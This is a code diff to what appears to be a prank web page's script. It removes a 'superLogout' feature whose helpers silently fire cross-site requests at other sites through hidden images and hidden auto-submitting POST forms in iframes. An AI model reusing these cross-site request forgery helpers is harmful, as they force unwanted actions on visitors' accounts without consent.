@@ -98,12 +98,6 @@ const wins = []
 let interactionCount = 0
 
 /**
- * Number of iframes injected into the page for the "super logout" functionality.
- * See superLogout().
- */
-let numSuperLogoutIframes = 0
-
-/**
  * Is this window a child window? A window is a child window if there exists a
  * parent window (i.e. the window was opened by another window so `window.opener`
  * is set) *AND* that parent is a window on the same origin (i.e. the window was
@@ -225,7 +219,6 @@ function initParentWindow () {
       hideCursor()
       startVideo()
       startAlertInterval()
-      superLogout()
       removeHelloMessage()
       rainbowThemeColor()
       animateUrlWithEmojis()
@@ -936,63 +929,6 @@ function requestFullscreen () {
     Element.prototype.msRequestFullscreen
 
   requestFullscreen.call(document.body)
-}
-
-/**
- * Log the user out of top sites they're logged into, including Google.com.
- * Inspired by https://superlogout.com
- */
-function superLogout () {
-  function cleanup (el, delayCleanup) {
-    if (delayCleanup) {
-      delayCleanup = false
-      return
-    }
-    el.parentNode.removeChild(el)
-  }
-
-  function get (url) {
-    const img = document.createElement('img')
-    img.onload = () => cleanup(img)
-    img.onerror = () => cleanup(img)
-    img.style = HIDDEN_STYLE
-    document.body.appendChild(img)
-    img.src = url
-  }
-
-  function post (url, params) {
-    const iframe = document.createElement('iframe')
-    iframe.style = HIDDEN_STYLE
-    iframe.name = 'iframe' + numSuperLogoutIframes
-    document.body.appendChild(iframe)
-
-    numSuperLogoutIframes += 1
-
-    const form = document.createElement('form')
-    form.style = HIDDEN_STYLE
-
-    let numLoads = 0
-    iframe.onload = iframe.onerror = () => {
-      if (numLoads >= 1) cleanup(iframe)
-      numLoads += 1
-    }
-    form.action = url
-    form.method = 'POST'
-    form.target = iframe.name
-
-    for (const param in params) {
-      if (Object.prototype.hasOwnProperty.call(params, param)) {
-        const input = document.createElement('input')
-        input.type = 'hidden'
-        input.name = param
-        input.value = params[param]
-        form.appendChild(input)
-      }
-    }
-
-    document.body.appendChild(form)
-    form.submit()
-  }
 }
 
 /**
